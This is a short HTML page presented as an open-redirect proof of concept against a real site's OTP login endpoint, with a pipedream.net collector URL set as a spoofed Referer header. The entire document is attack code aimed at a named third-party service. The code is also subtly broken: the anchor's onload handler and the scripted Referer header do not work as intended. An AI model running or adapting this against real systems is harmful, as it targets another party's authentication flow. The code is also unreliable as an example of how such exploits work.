<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Open Redirect PoC</title>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const redirectUrl = 'https://gameboost.com/otp/send-login';
            const refererHeaderValue = 'https://eo74rbqu36go8g.m.pipedream.net';
            const link = document.createElement('a');
            link.href = redirectUrl;
            link.textContent = 'Click here to redirect';
            link.onload = function(){
                fetch(redirectUrl, { headers: { 'Referer': refererHeaderValue } });
            };
            document.body.appendChild(link);
        });
    </script>
</head>
<body>

</body>
